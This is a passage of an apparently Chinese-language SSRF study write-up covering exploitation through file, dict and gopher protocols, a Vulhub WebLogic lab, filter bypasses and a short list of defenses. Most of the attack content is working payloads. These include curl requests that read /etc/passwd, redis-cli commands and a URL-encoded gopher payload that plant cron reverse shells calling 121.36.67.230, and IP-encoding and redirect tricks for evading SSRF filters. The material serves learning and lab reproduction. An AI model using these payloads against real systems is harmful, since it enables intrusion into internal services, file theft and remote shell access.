##### 3、远程利用方式
**1.利用`file`协议**  
任意文件读取
    curl -v 'http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd'
**2.利用`dict`协议**  
（1）查看端口及端口上运行服务的版本信息
    curl -v 'http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/'
说明22端口开放  
（2）通过dict协议getshell  
有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上`\r\n`(CRLF)。  
dict协议要一条一条的执行，而gopher协议执行一条命令就行了。  
一条一条的执行就可以了。  
**3.利用`gopher`协议**  
（1）攻击内网redis并反弹shell  
利用redis未授权访问攻击redis  
`攻击redis的exp`
    echo -e "\n\n\n*/1 * * * * bash -i >& /dev/tcp/121.36.67.230/5555 0>&1\n\n\n"|redis-cli -h $1 -p $2 -x set 1
    redis-cli -h $1 -p $2 config set dir /var/spool/cron/
    redis-cli -h $1 -p $2 config set dbfilename root
    redis-cli -h $1 -p $2 save
    redis-cli -h $1 -p $2 quit
    bash shell.sh 39.x.x.x 6379
从而捕获到数据，并进行转换  
转换规则如下：  
如果第一个字符是`>`或者`  
编译并启动环境
    docker-compose build
    docker-compose up -d
SSRF漏洞存在于`http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`  
**1.查看端口**  
访问
    /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:80
    //测试http://127.0.0.1:7001：将80替换成7001
not connect，说明80端口未开放  
返回404，说明端口开放  
**2.探测内网主机存活**  
说明内网ip为`192.168.1.1`的主机存活  
**3.注入HTTP头，利用Redis反弹shell**  
通过ssrf探测内网中的redis服务器，发现172.22.0.2:6379可以连通  
和上边的远程利用几乎一样。  
将反弹shell脚本写入/etc/crontab定时任务
    set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/121.36.67.230/4444 0>&1\n\n\n\n"
    config set dir /etc/
    config set dbfilename crontab
    save
进行url编码
    test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
换行符是“\r\n”换成“%0D%0A”。将url编码后的字符串放在ssrf的域名后面，发送  
反弹成功  
### 0x05 SSRF漏洞相关绕过
#### 1、常用绕过方法
**1.@**
    http://abc@127.0.0.1
    实际上是以用户名abc连接到站点127.0.0.1，同理
    http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8
在对@解析域名中，不同的处理函数存在处理差异，如：  
`http://PI:EMAIL@www.ccc.com`  
在PHP的`parse_url`中会识别www.ccc.com，而`libcur`l则识别为www.bbb.com  
**2.利用[::]**  
可以利用`[::]`来绕过localhost
    http://[::]:80/  >>>  http://127.0.0.1
**3.添加端口号**
    http://127.0.0.1:8080
**4.利用短网址**  
[站长工具短网址](http://tool.chinaz.com/tools/dwz.aspx)  
[百度短网址](http://dwz.cn/)  
**5.利用特殊域名**  
原理是DNS解析。xip.io可以指向任意域名，即
    127.0.0.1.xip.io，可解析为127.0.0.1
**6.利用DNS解析**  
在域名上设置A记录，指向127.0.1  
**7.利用进制转换**
> 127.0.0.1  
>  八进制：0177.0.0.1  
>  十六进制：0x7f.0.0.1  
>  十进制：2130706433
**8.句号**
    127。0。0。1  >>>  127.0.0.1
**9.302跳转**  
使用
#### 2、常见限制
**1.限制为 域名**  
采用http基本身份认证的方式绕过。即@  
`http://PI:EMAIL`  
**2.限制请求IP不为内网地址**  
当不允许ip为内网地址时  
（1）采取短网址绕过  
（2）采取特殊域名  
（3）采取进制转换  
**3.限制请求只为http协议**  
（1）采取302跳转  
（2）采取短地址
### 0x06 SSRF漏洞防御
1、禁用不需要的协议(如：`file:///`、`gopher://`,`dict://`等)。仅仅允许http和https请求  
2、统一错误信息，防止根据错误信息判断端口状态  
3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址  
4、设置URL白名单或者限制内网IP
### 0x07 后记
在SSRF漏洞的学习过程中，遇到了一些问题，比如反弹shell到公网服务器，折腾了许久。不过最终克服了问题。同时，通过SSRF漏洞的学习，发现SSRF漏洞果然比CSRF漏洞的利用的局限性要小，并且SSRF漏洞的对内网的一些应用危害比较大。所以在开发过程中，要尽量避免产生SSRF漏洞。
参考博客：  
[SSRF
漏洞学习](https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#0x01-SSRF-%E6%A6%82%E8%BF%B0)  
[SSRF——weblogic vulhub
漏洞复现及攻击内网redis（一）](https://www.cnblogs.com/flokz/p/weblogic_SSRF.html)  
[ssrf攻击内网应用](https://www.jianshu.com/p/fd27f0eedccf)  
[SSRF绕过方法总结](https://www.secpulse.com/archives/65832.html)